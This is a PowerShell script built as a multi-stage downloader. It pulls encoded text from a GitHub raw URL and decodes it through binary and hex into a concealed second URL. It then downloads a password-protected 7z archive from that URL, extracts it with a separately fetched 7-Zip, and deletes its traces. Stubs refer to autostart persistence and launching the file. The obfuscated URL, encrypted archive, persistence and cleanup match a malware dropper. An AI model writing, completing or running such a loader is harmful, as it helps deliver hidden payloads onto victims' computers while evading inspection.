# Stage 1: Fetch text from URL
Function FetchTextFromURL {
    Param ([string]$url)
    $rawText = Invoke-RestMethod -Uri $url
    Write-Host "Stage 1 - Raw Text:" $rawText
    return $rawText
}

# Stage 2: Decode the text into binary
Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
    Write-Host "Stage 2 - Binary String:" $binaryString
    return $binaryString
}

# Stage 3: Decode binary into hex
Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object {
        if ($_ -match '^[01]{8}$') {
            '{0:X}' -f [Convert]::ToInt32($_, 2)
        } else {
            Write-Error "Invalid binary group: $_"
            return $null
        }
    }
    Write-Host "Stage 3 - Hex String:" ($hexString -join '')
    return ($hexString -join '')
}

# Stage 4: Decode hex into ASCII
Function Convert-HexToASCII {
    Param ([string]$hexString)
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    Write-Host "Stage 4 - ASCII Text (Final URL):" $asciiText
    return $asciiText
}

# Stage 5: Create temp folder
Function CreateTempFolder {
    $tempFolderPath = "S:\downloader\temp"
    New-Item -ItemType Directory -Force -Path $tempFolderPath
    return $tempFolderPath
}

# Stage 6: Download file from final URL
# Re-using Download-File function provided

# Stage 7 & 8: Download and extract portable zipped 7z executable
Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $tempFolderPath = CreateTempFolder
    $sevenZipDownloadPath = "$tempFolderPath\7za.zip"
    $sevenZipExtractPath = "$tempFolderPath\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
    return $sevenZipExtractPath
}

# Stage 9: Decode password
# Re-using Get-DecryptedPassword function provided

# Stage 10: Use 7z to unzip the file
Function UnzipFileWith7Zip {
    Param (
        [string]$sevenZipCmdPath,
        [string]$filePath,
        [string]$outputPath,
        [string]$password
    )
    & $sevenZipCmdPath x $filePath -o$outputPath -p$password
}

# Stage 11: Setup for autostart not implemented for brevity

# Stage 12: Start the file
# To be implemented as per requirements

# Stage 13: Cleanup - Delete the temp folder and setup files
Function Cleanup {
    Param ([string]$folderPath)
    Remove-Item -Path $folderPath -Recurse -Force
}

# Script Execution Example (Uncomment as needed for debugging)

# $url = "https://raw.githubusercontent.com/1/1/main/8.txt"
# $rawText = FetchTextFromURL -url $url
# $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
# $hexString = Convert-BinaryToHex -binaryString $binaryString
# $finalUrl = Convert-HexToASCII -hexString $hexString
# $tempFolderPath = CreateTempFolder
# $downloadPath = "$tempFolderPath\DownloadedFile.7z"
# Download-File -url $finalUrl -path $downloadPath
# $sevenZipExtractPath = DownloadAndExtract7Zip
# $password = Get-DecryptedPassword
# $sevenZipCmdPath = "$sevenZipExtractPath\7za.exe"
# UnzipFileWith7Zip -sevenZipCmdPath $sevenZipCmdPath -filePath $downloadPath -outputPath "$tempFolderPath\ExtractedFile" -password $password
# Cleanup -folderPath $tempFolderPath
